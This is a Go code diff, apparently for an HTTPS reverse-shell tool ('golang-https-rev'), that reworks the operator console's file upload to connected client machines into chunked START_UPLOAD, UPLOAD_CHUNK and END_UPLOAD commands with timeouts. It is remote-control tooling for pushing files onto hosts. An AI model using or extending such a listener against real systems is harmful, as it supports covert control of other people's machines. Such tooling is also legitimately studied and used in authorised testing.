@@ -11,6 +11,7 @@ import (
 	"log"
 	"os"
 	"strings"
+	"time"
 
 	"golang-https-rev/pkg/certs"
 	"golang-https-rev/pkg/server"
@@ -200,13 +201,63 @@ func interactiveShell(l *server.Listener) {
 					fmt.Printf("Error compressing file: %v\n", err)
 					continue
 				}
-				cmd := fmt.Sprintf("UPLOAD %s %s", remotePath, compressed)
-				if err := l.SendCommand(currentClient, cmd); err != nil {
-					fmt.Printf("Error sending upload: %v\n", err)
+				
+				// Send file in chunks to avoid exceeding buffer limits on Windows
+				const chunkSize = 65536 // 64KB chunks
+				totalSize := len(compressed)
+				
+				// Send metadata: START_UPLOAD <remote_path> <total_size>
+				startCmd := fmt.Sprintf("START_UPLOAD %s %d", remotePath, totalSize)
+				if err := l.SendCommand(currentClient, startCmd); err != nil {
+					fmt.Printf("Error starting upload: %v\n", err)
 					currentClient = ""
 					continue
 				}
-				resp, err := l.GetResponse(currentClient, 5000000000)
+				resp, err := l.GetResponse(currentClient, 30*time.Second)
+				if err != nil || !strings.Contains(resp, "OK") {
+					fmt.Printf("Error getting start upload response: %v\n", err)
+					currentClient = ""
+					continue
+				}
+				
+				// Send chunks
+				for i := 0; i < totalSize; i += chunkSize {
+					end := i + chunkSize
+					if end > totalSize {
+						end = totalSize
+					}
+					chunk := compressed[i:end]
+					chunkCmd := fmt.Sprintf("UPLOAD_CHUNK %s", chunk)
+					if err := l.SendCommand(currentClient, chunkCmd); err != nil {
+						fmt.Printf("Error sending upload chunk: %v\n", err)
+						currentClient = ""
+						break
+					}
+					resp, err := l.GetResponse(currentClient, 30*time.Second)
+					if err != nil {
+						fmt.Printf("Error getting chunk response: %v\n", err)
+						currentClient = ""
+						break
+					}
+					if !strings.Contains(resp, "OK") {
+						fmt.Printf("Chunk error: %s\n", resp)
+						currentClient = ""
+						break
+					}
+				}
+				
+				if currentClient == "" {
+					continue
+				}
+				
+				// Send END_UPLOAD to finalize
+				endCmd := fmt.Sprintf("END_UPLOAD %s", remotePath)
+				if err := l.SendCommand(currentClient, endCmd); err != nil {
+					fmt.Printf("Error ending upload: %v\n", err)
+					currentClient = ""
+					continue
+				}
+				resp, err = l.GetResponse(currentClient, 30*time.Second)
 				if err != nil {
 					fmt.Printf("Error getting upload response: %v\n", err)
 					currentClient = ""
